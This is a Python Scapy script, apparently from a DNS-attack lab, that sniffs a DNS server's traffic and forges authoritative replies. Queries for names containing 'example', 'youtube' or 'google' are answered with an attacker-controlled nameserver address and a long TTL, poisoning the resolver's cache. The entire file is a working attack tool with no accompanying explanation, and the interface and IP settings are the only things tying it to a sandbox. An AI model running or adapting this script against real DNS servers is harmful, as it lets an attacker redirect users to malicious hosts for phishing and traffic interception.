#!/usr/bin/env python3
from scapy.all import *

def spoof_dns(pkt):
    if DNS in pkt:
        print("============ DNS packet info ============")
        print("Source IP:", pkt[IP].src)
        print("Source Port:", pkt[UDP].sport)
        print("Destination IP:", pkt[IP].dst)
        print("Destination Port:", pkt[UDP].dport)
        print("Query ID:", pkt[DNS].id)
        print("DNS Query Domain:", pkt[DNS].qd)
        print("DNS Query Domain Name:", pkt[DNS].qd.qname)
        # print("More DNS packet details:")
        # pkt[DNS].show() 
        print("=========================================")


target_domains = [b'example', b"youtube", b"google"]
def poison_dns(pkt):
    if DNS in pkt:
        # Check if DNS Server is contacting other DNS servers and looking for our target domains
        if pkt[IP].src == "10.9.0.53" and match_query(pkt[DNS].qd.qname):
            # Invert the src/dst IP/ports (forge the response)
            src_ip, src_port = pkt[IP].dst, pkt[UDP].dport
            dest_ip, dest_port = pkt[IP].src, pkt[UDP].sport
            # Extract the query data from the DNS packet
            dns_query_id, dns_query_dmn, dns_query_dmn_name = pkt[DNS].id, pkt[DNS].qd, pkt[DNS].qd.qname
            # Our Nameserver IP
            query_data = "10.9.0.153"
            # Send the froged DNS response to the victim
            send_dns(
                src_ip, dest_ip, src_port, dest_port, 
                dns_query_id, dns_query_dmn, dns_query_dmn_name, 
                query_data
            )

def match_query(query_domain):
    for domain in target_domains:
        if domain in query_domain:
            return True
    return False

# Call this function with proper arguments at the right timing to send DNS packets to conduct the attack
def send_dns(source_ip, dest_ip, source_port, dest_port, dns_query_id, dns_query_domain, dns_query_domain_name, query_data):
    IPpkt = IP(dst=dest_ip, src=source_ip)
    UDPpkt = UDP(dport=dest_port, sport=source_port)
    Anssec = DNSRR(rrname=dns_query_domain_name, type='A',ttl=259200, rdata=query_data)
    DNSpkt = DNS(id=dns_query_id, qd=dns_query_domain, aa=1, rd=0, qr=1,
            qdcount=1, ancount=1, an=Anssec)
    dns_pkt = IPpkt/UDPpkt/DNSpkt
    print("============ Sending DNS packet ============")
    print("Source IP:", source_ip)
    print("Source Port:", source_port)
    print("Destination IP:", dest_ip)
    print("Destination Port:", dest_port)
    print("Query ID:", dns_query_id)
    print("DNS Query Domain:", dns_query_domain)
    print("DNS Query Domain Name:", dns_query_domain_name)
    print("DNS Query Data:", query_data)
    # print("More DNS packet details:")
    # dns_pkt.show() 
    print("=========================================")
    send(dns_pkt)


# Monitor packets from the DNS server
MyFilter = "udp and host 10.9.0.53" 

# Change iface to the correct one by `ifconfig` in the attacker's container and finds which iface corresponds to the DNS server's IP
print("DNS Poisoning Attack is running...")
pkt = sniff(iface='br-2985fba60534', filter=MyFilter, prn=poison_dns)
# pkt = sniff(iface='br-2985fba60534', filter=MyFilter, prn=spoof_dns)
